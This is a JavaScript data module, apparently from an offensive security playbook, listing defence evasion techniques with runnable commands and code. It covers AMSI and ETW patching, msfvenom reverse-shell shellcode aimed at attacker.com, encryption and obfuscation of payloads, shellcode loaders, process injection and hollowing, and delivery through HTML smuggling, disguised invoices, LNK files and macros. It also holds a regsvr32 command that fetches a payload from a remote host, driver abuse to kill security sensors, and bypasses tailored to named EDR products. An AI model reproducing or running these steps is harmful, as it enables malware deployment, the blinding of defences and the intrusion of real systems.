export const EVASION = {
  id: "evasion",
  name: "Evasion",
  tacticId: "TA0005.E",
  subtitle: "AMSI/ETW Bypass • Shellcode Gen • Obfuscation • Loaders • Process Injection • Delivery • EDR-Specific Bypass",
  color: "#a855f7",
  techniques: [
    {
      name: "AMSI & ETW Bypass Engineering",
      id: "T1562.AMSI",
      summary: "AmsiScanBuffer patch • EtwEventWrite patch • HWBP • CLR reflection bypass",
      description: "Disable telemetry at the source — patch AMSI and ETW to blind Windows security instrumentation before executing offensive tooling",
      tags: ["AMSI", "ETW", "HWBP", "CLR", "T1562"],
      steps: [
        "Patch AmsiScanBuffer in-process (PowerShell):\n# AMSI works by calling AmsiScanBuffer() with your script/assembly content before execution\n# If it returns AMSI_RESULT_CLEAN (1): execution proceeds\n# If we patch the first byte(s) to force return AMSI_RESULT_CLEAN: all scans pass\n# Approach 1: patch via reflection (no P/Invoke needed, pure PS):\n> $a = [Ref].Assembly.GetTypes() | Where {$_.Name -like '*Amsi*'}\n> $b = $a | ForEach { $_.GetFields('NonPublic,Static') } | Where {$_.Name -like '*Context*'}\n> $ptr = $b.GetValue($null)\n> [IntPtr[]]$ptrs = @($ptr)\n> $handle = [Runtime.InteropServices.Marshal]::ReadIntPtr($ptrs[0])\n> [Runtime.InteropServices.Marshal]::WriteByte($handle, 0xEB)  # JMP over scan logic\n# Approach 2: set amsiInitFailed flag (simpler, same effect):\n> [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n# amsiInitFailed=true: PowerShell skips AMSI entirely for all subsequent script executions",
        "ETW bypass via EtwEventWrite patch:\n# ETW (Event Tracing for Windows) is how EDRs and security tools receive real-time telemetry\n# EtwEventWrite() in ntdll.dll is called by the CLR and other components to log security events\n# Patching it with RET (0xC3) makes it return immediately without writing any events\n# Effect: all .NET assembly execution, process creation, and module load events are silenced\n> $ntdll = [Diagnostics.Process]::GetCurrentProcess().Modules | Where {$_.ModuleName -eq 'ntdll.dll'}\n> $baseAddr = $ntdll.BaseAddress\n> $etwAddr = [Win32]::GetProcAddress($baseAddr, 'EtwEventWrite')\n> # Make page writable (RWX) before patching:\n> [Win32]::VirtualProtect($etwAddr, [UIntPtr]5, 0x40, [Ref]$old)\n> [Runtime.InteropServices.Marshal]::WriteByte($etwAddr, 0xC3)  # RET — function returns immediately\n> # Restore original protection after patch:\n> [Win32]::VirtualProtect($etwAddr, [UIntPtr]5, $old, [Ref]$old)\n# Patch AMSI first, then ETW — together they blind both content scanning and behavioral telemetry",
        "Hardware Breakpoint (HWBP) based AMSI bypass:\n# Use HWBP on AmsiScanBuffer to intercept and modify call\n# Set DR0-DR3 debug registers via SetThreadContext\n# Vectored Exception Handler catches EXCEPTION_SINGLE_STEP\n# Modify rcx/return value before scan executes\n$ SharpHook.exe --method AmsiScanBuffer --patch\n# No memory writes = harder to detect than patching bytes",
        "CLR reflection bypass for .NET assemblies:\n> [System.AppDomain]::CurrentDomain.GetAssemblies() | Where {$_.FullName -like '*System.Management.Automation*'}\n> # Patch via reflection to disable AMSI in PowerShell runspace\n> $field = [Microsoft.PowerShell.AmsiUtils].GetField('amsiInitFailed', 'NonPublic,Static')\n> $field.SetValue($null, $true)\n# Sets amsiInitFailed flag → skips all AMSI calls in current runspace",
        "AMSI bypass in CLR hosted process (.NET loader):\n# When building a custom .NET loader, patch AMSI before Assembly.Load():\n> // 1. Load amsi.dll and get AmsiScanBuffer address\n> IntPtr amsi = LoadLibrary(\"amsi.dll\");\n> IntPtr addr = GetProcAddress(amsi, \"AmsiScanBuffer\");\n> // 2. VirtualProtect to make page writable\n> VirtualProtect(addr, (UIntPtr)6, 0x40, out uint old);\n> // 3. Overwrite with: mov eax, 0x80070057; ret (returns AMSI_RESULT_CLEAN)\n> byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };\n> Marshal.Copy(patch, 0, addr, patch.Length);\n> // 4. Now load and run assembly safely\n> Assembly asm = Assembly.Load(File.ReadAllBytes(\"payload.exe\"));\n> asm.EntryPoint.Invoke(null, new object[] { new string[] { } });\n# AMSI patched in-process before any CLR assembly scanning occurs\n# No external tool needed — inline C# in your loader"
      ]
    },
    {
      name: "Shellcode Generation",
      id: "T1027.SC",
      summary: "Donut • sRDI • msfvenom • Cobalt Strike • position-independent",
      description: "Convert .NET assemblies, PE files, and scripts into position-independent shellcode for reflective injection and loader delivery",
      tags: ["Donut", "sRDI", "shellcode", "PIC", "T1027"],
      steps: [
        "Convert .NET assembly to shellcode with Donut:\n$ donut -f 1 -a 2 -o payload.bin tool.exe\n$ donut -f 1 -a 2 -o payload.bin tool.exe -p 'arg1 arg2'\n# -f 1: raw shellcode output\n# -a 2: x64\n# Supports .NET assemblies, EXEs, DLLs, VBScript, JScript\n# Outputs PIC shellcode suitable for injection",
        "Convert DLL to shellcode with sRDI:\n$ python3 ShellcodeRDI.py payload.dll FunctionName\n# sRDI (Shellcode Reflective DLL Injection)\n# Converts DLL to PIC shellcode with built-in loader\n# Resolves imports at runtime without LoadLibrary\n$ python3 ConvertToShellcode.py payload.dll > shellcode.bin",
        "Cobalt Strike shellcode generation:\n# Cobalt Strike: Attacks → Packages → Payload Generator\n# Or via aggressor script:\n> $sc = shellcode(listener_name, true, 'x64');\n> blob_to_file($sc, '/tmp/shellcode.bin');\n# CS generates position-independent HTTPS/DNS shellcode\n# Used as basis for custom loaders",
        "msfvenom for standard shellcode:\n$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=attacker.com LPORT=443 -f raw -o shellcode.bin\n$ msfvenom -p windows/x64/exec CMD='calc.exe' -f c -o test_shellcode.c\n# -f raw: raw bytes for custom loader\n# -f c: C array for embedding in loader source\n# Combine with custom encoder to bypass AV",
        "Custom shellcode from assembly:\n# Compile with NASM for custom shellcode\n$ nasm -f bin shellcode.asm -o shellcode.bin\n# Extract from compiled binary:\n$ objcopy -O binary --only-section=.text shellcode.exe shellcode.bin\n# Ensure PIC: no absolute addresses, use RIP-relative addressing\n# Test PIC: load at random address and execute — must not crash"
      ]
    },
    {
      name: "Signature Evasion & Obfuscation",
      id: "T1027.OBF",
      summary: "LLVM obfuscation • SGN encoder • string encryption • API hashing • polymorphic",
      description: "Evade static and behavioral signatures through code transformation, encryption, and obfuscation to defeat AV/EDR scanning",
      tags: ["LLVM", "SGN", "string encryption", "API hashing", "T1027"],
      steps: [
        "Shikata Ga Nai (SGN) polymorphic encoder:\n$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker.com LPORT=4444 -e x64/xor_dynamic -i 5 -f raw > encoded.bin\n$ sgn -a 64 -i 10 shellcode.bin -o encoded.bin\n# Polymorphic XOR encoder — each iteration produces unique output\n# -i: iterations, more = harder to detect\n# No two generated shellcodes share the same signature",
        "String encryption in loaders:\n# Never hardcode strings: function names, DLL names, URLs, keys\n# XOR encrypt all strings at compile time, decrypt at runtime:\n> byte[] enc = { 0x4c, 0x4f, 0x41, 0x44, 0x4c, 0x49, 0x42, 0x52 };\n> string result = Encoding.ASCII.GetString(enc.Select(b => (byte)(b ^ 0x01)).ToArray());\n# Or use compile-time string obfuscation with Obfuscator.LLVM\n# Goal: no suspicious plaintext strings (VirtualAlloc, CreateRemoteThread, etc.)",
        "API Hashing to avoid IAT scanning:\n# Instead of importing WinAPI by name:\n# Compute CRC32/DJB2 hash of function name at runtime\n# Walk PEB → LDR_DATA_TABLE → export table\n# Compare hash of each export name until match\n> uint hash = 0; foreach(char c in funcName) hash = ((hash << 5) + hash) ^ c;\n# No suspicious strings like 'VirtualAllocEx' in binary\n# Tool: HellsGate, SysWhispers use this pattern for syscall resolution",
        "LLVM-based obfuscation:\n$ git clone https://github.com/obfuscator-llvm/obfuscator\n# Compile with: clang -mllvm -bcf -mllvm -sub -mllvm -fla payload.c -o payload.exe\n# -bcf: bogus control flow, -sub: instruction substitution, -fla: control flow flattening\n# Dramatically increases binary complexity\n# Defeats pattern-based static analysis",
        "AES encryption packing:\n# Encrypt shellcode/PE with AES-256 before embedding:\n> using Aes aes = Aes.Create();\n> aes.Key = key; aes.IV = iv;\n> byte[] encrypted = aes.CreateEncryptor().TransformFinalBlock(shellcode, 0, shellcode.Length);\n# Decrypt at runtime in stub → execute\n# XOR with rotating key for simpler approach:\n> for (int i = 0; i < buf.Length; i++) buf[i] ^= key[i % key.Length];\n# Combine: encrypted + junk bytes + decoy functions = unique binary every build"
      ]
    },
    {
      name: "Loader Build",
      id: "T1620.LOAD",
      summary: "UDRL • PIC loader • reflective loading • crypter • custom loader",
      description: "Build a shellcode loader with User-Defined Reflective Loader (UDRL), decryption stub, and EDR bypass layers for stealthy in-memory execution",
      tags: ["UDRL", "PIC loader", "reflective loading", "crypter", "T1620"],
      steps: [
        "User-Defined Reflective Loader (UDRL) for Cobalt Strike:\n# UDRL replaces Cobalt Strike's default reflective loader\n# Customize how beacon is mapped into memory\n# Avoid default CS reflective loader signatures\n$ git clone https://github.com/stephenfewer/ReflectiveDLLInjection\n# Compile custom UDRL, reference in CS malleable profile:\n# set userdefinedreflectiveloader '/path/to/UDRL.x64.o';",
        "Build PIC shellcode loader (C/C++):\n# Allocate RW memory → decrypt shellcode → flip to RX → execute\n> LPVOID mem = VirtualAlloc(NULL, len, MEM_COMMIT, PAGE_READWRITE);\n> memcpy(mem, encryptedShellcode, len);\n> decrypt(mem, len, key);  // XOR/AES in-place\n> DWORD old;\n> VirtualProtect(mem, len, PAGE_EXECUTE_READ, &old);\n> ((void(*)())mem)();\n# Avoid RWX — RW → RX transition is less suspicious than RWX allocation",
        "Indirect syscall loader to bypass user-mode hooks:\n# Use SysWhispers3 or HellsGate to resolve syscall numbers at runtime\n# Execute NtAllocateVirtualMemory via syscall stub, not ntdll.dll\n$ python3 SysWhispers3.py --arch x64 --out-file syscalls\n# Include generated syscalls.h/.c in loader\n# EDR hooks in ntdll are bypassed — goes directly to kernel",
        "Module stomping loader:\n# Load a legitimate DLL into target process\n# Overwrite its memory with shellcode\n# Shellcode executes from 'signed' module address space\n> HMODULE mod = LoadLibraryA('xpsservices.dll'); // Rarely used, signed MS DLL\n> VirtualProtect(mod, shellcodeLen, PAGE_READWRITE, &old);\n> memcpy(mod, shellcode, shellcodeLen);\n> VirtualProtect(mod, shellcodeLen, PAGE_EXECUTE_READ, &old);\n# Thread starts from signed module → less suspicious in call stack",
        "Timer/sleep callback-based execution:\n# Avoid direct CreateThread from loader\n# Use Windows timer callback for shellcode execution:\n> HANDLE hTimer = NULL;\n> CreateTimerQueueTimer(&hTimer, NULL, (WAITORTIMERCALLBACK)shellcode, NULL, 100, 0, WT_EXECUTEONLYONCE);\n# Or use NtSetTimer, EnumerateLoadedModules callback\n# Callback-based execution breaks typical 'thread from loader' detection pattern"
      ]
    },
    {
      name: "Process Injection",
      id: "T1055",
      summary: "Threadless injection • EarlyBird APC • VEH injection • APC injection • module stomping",
      description: "Inject shellcode into remote processes without triggering common detection via alternative injection primitives",
      tags: ["threadless injection", "EarlyBird APC", "VEH", "APC injection", "T1055"],
      steps: [
        "EarlyBird APC injection:\n# Create process in suspended state\n# Queue APC before main thread resumes — shellcode runs before AV thread monitoring\n> PROCESS_INFORMATION pi;\n> CreateProcessA(NULL, 'C:\\\\Windows\\\\System32\\\\svchost.exe', NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);\n> LPVOID mem = VirtualAllocEx(pi.hProcess, NULL, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n> WriteProcessMemory(pi.hProcess, mem, shellcode, len, NULL);\n> QueueUserAPC((PAPCFUNC)mem, pi.hThread, NULL);\n> ResumeThread(pi.hThread);\n# APC fires immediately on resume — before EDR thread monitoring starts",
        "Threadless injection via function pointer overwrite:\n# No new threads created — avoids CreateRemoteThread detection\n# Find a function pointer in target process (e.g., sleep callback)\n# Overwrite with shellcode address, trigger naturally\n> FARPROC sleepEx = GetProcAddress(GetModuleHandle('kernel32'), 'SleepEx');\n> uintptr_t hookAddr = (uintptr_t)sleepEx + offset;\n> WriteProcessMemory(hProcess, (LPVOID)hookAddr, &shellcodeAddr, sizeof(uintptr_t), NULL);\n# Shellcode triggered when target process naturally calls SleepEx",
        "VEH (Vectored Exception Handler) injection:\n# Register shellcode as a VEH in target process\n# Trigger controlled exception to execute shellcode\n> HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);\n> LPVOID mem = VirtualAllocEx(hProcess, NULL, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n> WriteProcessMemory(hProcess, mem, vehShellcode, len, NULL);\n> // shellcode registers itself as VEH, then triggers exception\n# VEH execution path differs from thread-based paths — evades thread monitoring",
        "NtQueueApcThread for injection into existing thread:\n# No new process/thread creation\n# Inject APC into existing alertable thread in target\n> NtQueueApcThread(hThread, (PPS_APC_ROUTINE)shellcodeAddr, NULL, NULL, NULL);\n# Thread must be in alertable wait state (SleepEx, WaitForSingleObjectEx)\n# Process Monitor: no CreateRemoteThread events",
        "Module stomping + remote injection:\n# In target process, load a benign DLL then overwrite with shellcode\n> // Inject loader shellcode via any method first\n> // Loader inside target: LoadLibrary → overwrite DLL memory → execute\n# Final shellcode appears to run from legitimate signed DLL address range\n# Memory forensics: shellcode at signed DLL memory = less suspicious\n$ Invoke-SharpInject.ps1 -pid TARGET_PID -technique ModuleStomping\n# Combine with call stack spoofing for maximum evasion"
      ]
    },
    {
      name: "Delivery",
      id: "T1027.DEL",
      summary: "DLL sideloading • HTML smuggling • macro • LNK • ClickOnce • MOTW bypass",
      description: "Get the payload onto the target system and execute it without triggering perimeter defenses or endpoint protection",
      tags: ["DLL sideloading", "HTML smuggling", "MOTW bypass", "ClickOnce", "T1027"],
      steps: [
        "DLL sideloading — find hijackable DLL opportunities:\n# Method 1: Process Monitor (Procmon) — canonical approach\n# Filter: Operation = CreateFile, Result = NAME NOT FOUND, Path ends with .dll\n# Run target application under Procmon → identifies all missing DLL searches\n# Focus on: DLLs searched in app's own directory before System32\n$ Procmon.exe /Quiet /Minimized /BackingFile C:\\procmon.pml\n# Method 2: Spartacus (C# automated scanner):\n$ Spartacus.exe --procmon C:\\procmon.pml --output C:\\results.csv\n# Spartacus parses Procmon output and ranks hijackable DLLs by exploitability\n# https://github.com/Accenture/Spartacus\n# Method 3: manual search for known-vulnerable apps (Siofra, DLLSpy):\n$ Siofra64.exe --mode file -f 'C:\\Program Files\\VulnApp\\app.exe' --enum-dependency --dll-hijack\n# Place malicious DLL in application directory:\n> cp shellcode_loader.dll 'C:\\\\Program Files\\\\LegitApp\\\\version.dll'\n# Signed app loads malicious DLL → shellcode runs from signed process context\n# Signed parent process = lower suspicion score for EDR",
        "HTML smuggling:\n# Reconstruct binary payload in browser via JavaScript Blob API\n# Bypasses email gateway/proxy AV since no binary attachment in transit\n> <script>\n>   const buf = Uint8Array.from(atob('BASE64_PAYLOAD'), c => c.charCodeAt(0));\n>   const blob = new Blob([buf], {type: 'application/octet-stream'});\n>   const a = document.createElement('a');\n>   a.href = URL.createObjectURL(blob);\n>   a.download = 'Invoice_2024.exe'; a.click();\n> </script>\n# Payload assembled client-side — never traverses network as binary",
        "ISO/IMG + LNK for MOTW bypass:\n# Files inside ISO/IMG containers don't receive Mark of the Web\n# LNK shortcut executes payload without SmartScreen warning:\n$ python3 lnkbomb.py -t C:\\\\Windows\\\\System32\\\\cmd.exe -a '/c start payload.exe' -o invoice.lnk\n# Package in ISO:\n$ mkisofs -o delivery.iso payload.exe invoice.lnk\n# User mounts ISO, clicks LNK → payload runs without zone identifier",
        "ClickOnce delivery (trusted execution):\n# ClickOnce apps run from internet with reduced UAC prompt\n# Host .application manifest pointing to malicious .NET app\n# User clicks web link → auto-download-and-execute\n> mage -New Application -Processor x86 -ToFile payload.application -Name 'Office Update'\n# Sign with self-signed cert (or stolen cert for higher trust)\n# Auto-update mechanism makes re-delivery easy",
        "Macro with AMSI bypass (Office):\n# VBA macro with AMSI bypass before executing shellcode\n> Private Declare PtrSafe Function VirtualProtect Lib \"kernel32\" (lpAddress As LongPtr, dwSize As LongPtr, flNewProtect As Long, lpflOldProtect As Long) As Long\n> Sub AutoOpen()\n>     ' Patch AMSI in Word's process\n>     Dim addr As LongPtr: addr = GetProcAddr(\"amsi.dll\", \"AmsiScanBuffer\")\n>     VirtualProtect addr, 8, &H40, 0\n>     ' Overwrite with RET (bypass scan)\n>     ' Execute shellcode via callback\n> End Sub\n# AMSI disabled in Office process before shellcode scanning occurs"
      ]
    },
    {
      name: "Crystalball / BOF-based Reflective Loading (C2 Agnostic)",
      id: "T1620.CRYSTAL",
      summary: "CrystalKit BOF • in-process reflective PE load • no fork-and-run • CS + Sliver",
      description: "Use Beacon Object File (BOF)-based reflective loaders to execute offensive .NET assemblies and PEs entirely in-process, bypassing the fork-and-run telemetry pattern that EDRs key on",
      tags: ["CrystalKit", "BOF", "reflective loader", "in-process", "T1620"],
      steps: [
        "Background — why fork-and-run is detectable:\n# Default 'execute-assembly' in Cobalt Strike uses fork-and-run:\n# beacon process (e.g. svchost.exe) forks → spawns sacrificial child process\n# child process loads .NET CLR (unusual for non-managed process) → executes assembly\n# child process exits after assembly completes → process tree is suspicious\n# EDRs flag: non-.NET process loading CLR, short-lived child processes spawning from beacon\n# CrowdStrike, SentinelOne, Elastic: all have rules for this pattern\n# CrystalKit solves this: loads CLR and executes assembly INSIDE the beacon process itself\n# No child process spawned → no fork-and-run process tree → CLR already expected in managed host\n# Trade-off: if assembly crashes, it takes down the beacon — use carefully on critical targets",
        "CrystalKit with Cobalt Strike — in-process .NET assembly execution:\n# CrystalKit: BOF-based in-process CLR loader for Cobalt Strike\n# Loads the .NET CLR into the beacon process, then executes the assembly\n# https://github.com/boku7/CobaltStrikeReflectiveLoader (reference UDRL pattern)\n# CrystalKit BOF setup in CS aggressor:\n> bof_pack($args, 'z', 'Seatbelt.exe -group=user');\n> beacon_inline_execute($bid, bof_read_file('CrystalKit.x64.o'), 'go', $args);\n# Assembly runs inside beacon process memory — no child process created\n# CLR initialized once per beacon lifetime; subsequent calls reuse it\n# Combine with UDRL to also control how the beacon itself is mapped:",
        "Cobalt Strike — full in-process execution pipeline:\n# Step 1: Use UDRL to load beacon without default reflective loader signature\n# set userdefinedreflectiveloader 'UDRL.x64.o'; in malleable C2 profile\n# Step 2: Use CrystalKit BOF for all assembly execution (no fork-and-run)\n# Step 3: Patch AMSI/ETW inside the beacon process before first assembly run:\n> beacon_inline_execute($bid, bof_read_file('amsi_patch.x64.o'), 'go', $null);\n> beacon_inline_execute($bid, bof_read_file('etw_patch.x64.o'), 'go', $null);\n# Step 4: Execute assembly in-process:\n> beacon_inline_execute($bid, bof_read_file('CrystalKit.x64.o'), 'go', bof_pack($a, 'z', 'Rubeus.exe asktgt /user:admin /rc4:HASH /ptt'));\n# Result: Rubeus executes inside beacon process — EDR sees no child process spawn",
        "Sliver — equivalent in-process assembly execution with Carapace / sideload:\n# Sliver does not natively support BOF execution in the same way as CS\n# Equivalent approach: use 'sideload' or 'execute-assembly' with in-process flag\n# Sliver 'sideload' loads a shared library (.dll/.so) reflectively in-process:\n$ sliver > use SESSION_ID\n$ sliver (session) > sideload --process lsass.exe /path/to/payload.dll ExportedFunction args\n# --process: the host process Sliver hollows/injects into (or current implant process)\n# For .NET assemblies in Sliver, use execute-assembly with sacrifice-process disabled:\n$ sliver (session) > execute-assembly --in-process /path/to/Seatbelt.exe -- -group=user\n# --in-process: loads CLR inside implant process, no sacrificial process\n# Mirrors CrystalKit's in-process execution model within Sliver's architecture",
        "AMSI/ETW patching before in-process assembly execution (both frameworks):\n# Before any in-process .NET assembly load, patch AMSI and ETW in the host process\n# Cobalt Strike (BOF):\n> beacon_inline_execute($bid, bof_read_file('TamperETW.x64.o'), 'go', $null);\n> beacon_inline_execute($bid, bof_read_file('InlineAmsiBypass.x64.o'), 'go', $null);\n# Sliver (inline execute):\n$ sliver (session) > execute-shellcode --pid 0 /path/to/amsi_patch.bin  # inject into self\n# Or pre-patch via Sliver extension (Armory):\n$ sliver (session) > armory install patch-amsi\n$ sliver (session) > patch-amsi\n# After patching: CLR loads without AMSI scanning assemblies → no detection on load\n# ETW patched: no EtwEventWrite telemetry from assembly execution"
      ]
    },
    {
      name: "CrowdStrike Falcon Evasion",
      id: "T1562.CS",
      summary: "Overwatch bypass • ML model evasion • kernel callbacks • ETW-Ti • Null-AMSI",
      description: "Techniques specific to bypassing CrowdStrike Falcon's behavioral AI, kernel callbacks, and Overwatch threat hunting",
      tags: ["CrowdStrike", "Falcon", "ETW-Ti", "kernel callbacks", "T1562"],
      steps: [
        "Bypass Falcon's kernel callback monitoring:\n# CrowdStrike Falcon registers kernel-mode callbacks via:\n# PsSetCreateProcessNotifyRoutine (process creation), PsSetCreateThreadNotifyRoutine (thread creation)\n# PsSetLoadImageNotifyRoutine (DLL/module loads), ObRegisterCallbacks (handle operations)\n# These callbacks fire at kernel level — userland hook bypass (syscalls) doesn't help here\n# Option 1: BYOVD — use vulnerable signed driver to enumerate and remove CS callback entries\n# (high risk: EDR vendors now alert on vulnerable driver loads via blocklists)\n# Option 2 (safer): avoid triggering monitored API sequences\n# Use NtCreateUserProcess directly (bypasses CreateProcess telemetry hooks)\n# Use indirect syscalls (SysWhispers3) to skip any ntdll userland hooks CS may have\n# Use APC injection into existing threads (no new thread creation event)\n# Use existing process (no process creation event) — inject into already-running process",
        "Evade Falcon ML behavioral model:\n# CS ML model scores process behavior over time\n# Low-and-slow: long sleep intervals between actions\n# Mimic legitimate application behavior patterns before malicious steps\n# Use living-off-the-land binaries (LOLBins) instead of custom tooling\n# mshta.exe, regsvr32.exe, wscript.exe for execution\n# Perform noisy legitimate-looking operations to dilute behavior score",
        "ETW-Ti (Threat Intelligence) bypass:\n# Falcon uses ETW Threat Intelligence provider for kernel telemetry\n# Patch EtwTiLogReadWriteVm in ntoskrnl (requires kernel access)\n# Safer: use hardware breakpoints on EtwEventWrite to null the call\n# Fiber-based execution: fibers don't trigger all thread callbacks\n# Use NtCreateSection + NtMapViewOfSection instead of VirtualAllocEx\n# Cobalt Strike: avoid CreateRemoteThread with fork-and-run alternatives",
        "Blind the sensor via handle manipulation:\n# CrowdStrike csagent.sys registers object callbacks\n# PPL (Protected Process Light) prevents handle opening to csagent\n# BYOVD: use vulnerable driver to remove CS kernel callbacks\n$ DriverQuery.exe /FO LIST | findstr -i crowdstrike\n# Known vulnerable drivers: RTCore64.sys (MSI Afterburner), DBUtil_2_3.sys\n# Use vulnerable driver to patch/nullify CS callback table entries",
        "Profile-based evasion for Overwatch:\n# Overwatch is human-driven threat hunting — harder to automate bypass\n# Ensure attack TTPs don't match common red team playbooks\n# Avoid: Mimikatz strings, default Cobalt Strike artifacts, common pipenames/mutexes\n# Custom tool naming, compile-time string changes, unique indicators per op\n# Randomize sleep jitter, beacon timing, payload size\n# Use encrypted C2 with domain fronting to hide network IOCs"
      ]
    },
    {
      name: "Microsoft Defender for Endpoint Evasion",
      id: "T1562.MDE",
      summary: "WDAC bypass • BYOVD • network protection bypass • SmartScreen • no userland hooks",
      description: "Techniques specific to bypassing Microsoft Defender for Endpoint (MDE) and Defender Antivirus",
      tags: ["MDE", "WDAC", "BYOVD", "SmartScreen", "T1562"],
      steps: [
        "Bypass Defender AV static scanning:\n# Defender uses AMSI for in-memory scanning\n# Patch AmsiScanBuffer before loading offensive tooling\n# Encrypt shellcode payload, decrypt at runtime in stub\n# Use custom packer to change binary signature\n# MinGW-compiled C loaders have lower detection rates than .NET\n# Test against Defender offline in VM before deployment:\n$ MpCmdRun.exe -Scan -ScanType 3 -File C:\\\\test\\\\payload.exe",
        "Bypass WDAC (Windows Defender Application Control):\n# WDAC blocks unsigned code from running\n# Find WDAC bypasses via LOLBins and trusted binaries:\n# regsvr32.exe, mshta.exe, odbcconf.exe, cmstp.exe\n$ regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll\n# Or find misconfigured WDAC policy allowing specific paths\n# Signed attacker tools bypass WDAC entirely — acquire code-signing cert",
        "BYOVD (Bring Your Own Vulnerable Driver):\n# Load vulnerable signed driver, use it to disable MDE\n$ sc.exe create vuln_drv binpath= C:\\\\vuln_drv.sys type= kernel\n$ sc.exe start vuln_drv\n# Use driver to terminate MsSense.exe (MDE sensor process)\n# Or remove MDE kernel callbacks via driver exploit\n# Known vulnerable drivers: RTCore64.sys (MSI), DBUtil_2_3.sys (Dell)\n# LOLDrivers reference: https://www.loldrivers.io/",
        "Bypass Defender network protection:\n# MDE network protection blocks known C2 IPs and suspicious DNS\n# Use domain fronting via legitimate CDN (Cloudflare, Azure Front Door)\n# Rotate C2 domains frequently to stay ahead of block lists\n# Use DoH (DNS over HTTPS) to bypass DNS-based blocking\n# Malleable C2 profile: mimic O365/Azure traffic patterns in headers/URIs",
        "MDE has no userland hooks — kernel-level only:\n# Unlike CrowdStrike/SentinelOne, MDE does not hook ntdll userland\n# Standard injection techniques work without syscall bypass\n# Focus on: avoiding ETW-Ti events, kernel callbacks, memory scanning\n# Use NtMapViewOfSection for shellcode allocation (less monitored than VirtualAllocEx)\n# Back memory with file-backed sections instead of anonymous allocations"
      ]
    },
    {
      name: "SentinelOne Evasion",
      id: "T1562.S1",
      summary: "Behavioral AI bypass • Static AI bypass • VEH bypass • ETW patch • CPL bypass",
      description: "Techniques specific to bypassing SentinelOne Singularity's behavioral AI, static AI engine, and kernel monitoring",
      tags: ["SentinelOne", "Behavioral AI", "VEH", "ETW", "CPL bypass", "T1562"],
      steps: [
        "Bypass SentinelOne static AI engine:\n# S1 static AI scans files on write and execution\n# Avoid PE format: use shellcode-only payloads, no PE header\n# Use custom packer/crypter — S1 static model trained on known malware families\n# Compile from source with modifications to avoid known signatures\n# Test: drop file to disk, check if S1 quarantines before execution\n# AMSI bypass needed for PowerShell-based tools",
        "Evade behavioral AI (Storyline engine):\n# S1 builds process storylines — chains of related events\n# Break the storyline chain using intermediate legitimate processes\n# Spawn from: explorer.exe, svchost.exe (via COM elevation)\n# Avoid direct parent-child chains: malicious_doc → cmd.exe → powershell.exe\n# Use WMI, COM, or scheduled tasks to break process lineage\n# Large time gaps between actions reduce behavioral correlation",
        "VEH-based bypass:\n# Use VEH injection carefully — register via legitimate API path\n# Avoid adding VEH immediately after allocation (suspicious sequence)\n# Add VEH from within a legitimate DLL's code section\n# Use hardware breakpoints (HWBP) instead of software exceptions\n# HWBP-based AMSI bypass: no suspicious exception flow in S1's telemetry",
        "CPL (Control Panel) file execution bypass:\n# S1 may have gaps in monitoring .cpl file execution paths\n$ rundll32.exe shell32.dll,Control_RunDLL payload.cpl\n# CPL files are DLLs with .cpl extension\n# Execution via Control Panel avoids some behavioral rules\n# Combine with DLL sideloading in a signed application directory\n# Test against current S1 policy — effectiveness varies by version",
        "Kernel callback and ETW bypass:\n# S1 registers extensive kernel callbacks for process/thread/image events\n# Use BYOVD to remove S1 kernel callbacks (requires vulnerable signed driver)\n# Patch EtwEventWrite to blind S1's ETW telemetry collection\n# Hardware breakpoints on ETW functions: no memory patches = no modification detection\n# Module stomping for shellcode execution: appears to run from signed module\n# Avoid RWX memory regions — use RW → RX transitions"
      ]
    },
    {
      name: "Palo Alto Cortex XDR Evasion",
      id: "T1562.CXDR",
      summary: "BTP bypass • Java bypass • whitelist abuse • process hollowing • resource exhaustion",
      description: "Techniques specific to bypassing Palo Alto Cortex XDR's Behavioral Threat Protection and prevention modules",
      tags: ["Cortex XDR", "Palo Alto", "BTP bypass", "whitelist abuse", "T1562"],
      steps: [
        "Bypass Behavioral Threat Protection (BTP):\n# Cortex XDR BTP uses rules similar to YARA for behavioral detection\n# BTP rules trigger on specific API call sequences and memory patterns\n# Break detection sequences: insert legitimate API calls between malicious ones\n# Use alternative APIs for same functionality: NtAllocateVirtualMemory vs VirtualAlloc\n# Long sleep periods between phases reduce behavioral correlation window",
        "Java process exploitation bypass:\n# Cortex XDR has known monitoring gaps in Java process telemetry\n# Java processes (java.exe) may have reduced behavioral scrutiny\n# Deploy payload via Java Runtime: jar with embedded shellcode\n# Use Java's Runtime.exec() to spawn processes outside XDR's process tree\n$ java -jar payload.jar\n# Java reflection to load shellcode: unsafe memory access via sun.misc.Unsafe",
        "Whitelist abuse and trusted process exploitation:\n# Cortex XDR whitelists signed Microsoft and known vendor processes\n# Abuse trusted processes for shellcode execution:\n# WerFault.exe, SgrmBroker.exe, backgroundTaskHost.exe\n# DLL sideloading via whitelisted application directory\n# COM object hijacking in whitelisted application context\n# Signed app → loads malicious DLL → executes shellcode from trusted context",
        "Process hollowing in trusted process:\n# Create legitimate signed process (suspended)\n# Hollow out memory, inject shellcode\n> CreateProcess('C:\\\\Windows\\\\System32\\\\RuntimeBroker.exe', ..., CREATE_SUSPENDED, ...);\n> NtUnmapViewOfSection(pi.hProcess, imageBase);\n> VirtualAllocEx(pi.hProcess, imageBase, payloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n> WriteProcessMemory(pi.hProcess, imageBase, payload, payloadSize, NULL);\n> SetThreadContext / ResumeThread;\n# XDR sees trusted RuntimeBroker.exe — harder to flag",
        "Exhaust XDR prevention module resources:\n# XDR prevention can be resource-limited in some deployments\n# Flood with legitimate-looking API calls before malicious activity\n# Use multi-threaded approach to saturate monitoring pipeline\n# Test in isolated environment: generate high-volume benign events, then inject\n# This is environment-specific and requires testing — not reliable standalone\n# Combine with other bypass techniques for layered evasion"
      ]
    },
    {
      name: "Elastic Security EDR Evasion",
      id: "T1562.ESDR",
      summary: "EQL rules bypass • detection rules study • expired certs • proxy injection • open source",
      description: "Techniques specific to bypassing Elastic Security EDR (formerly Endgame) and its EQL-based detection rules",
